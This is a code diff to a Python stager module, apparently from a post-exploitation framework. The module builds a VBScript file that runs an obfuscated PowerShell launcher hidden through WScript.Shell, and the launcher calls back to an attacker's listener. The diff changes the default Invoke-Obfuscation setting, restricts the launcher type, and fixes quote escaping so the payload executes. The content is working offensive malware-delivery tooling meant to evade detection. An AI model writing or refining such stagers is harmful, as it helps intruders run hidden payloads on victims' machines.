@@ -48,7 +48,7 @@ class Stager:
             'ObfuscateCommand' : {
                 'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                 'Required'      :   False,
-                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
+                'Value'         :   r'Token\All\1,Launcher\PS\12467'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -93,6 +93,9 @@ class Stager:
         obfuscateScript = False
         if obfuscate.lower() == "true":
             obfuscateScript = True
+            if "launcher" in obfuscateCommand.lower() and "ps" not in obfuscateCommand.lower():
+                print helpers.color("[!] Only 'PS' Invoke-Obfuscation Launcher is currently support for launcher_vbs")
+                return ""
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
@@ -103,7 +106,7 @@ class Stager:
         else:
             code = "Dim objShell\n"
             code += "Set objShell = WScript.CreateObject(\"WScript.Shell\")\n"
-            code += "command = \""+launcher.replace("'", "\\'")+"\"\n"
+            code += "command = \""+launcher.replace("\"", "\"+Chr(34)+\"")+"\"\n"
             code += "objShell.Run command,0\n"
             code += "Set objShell = Nothing\n"
 
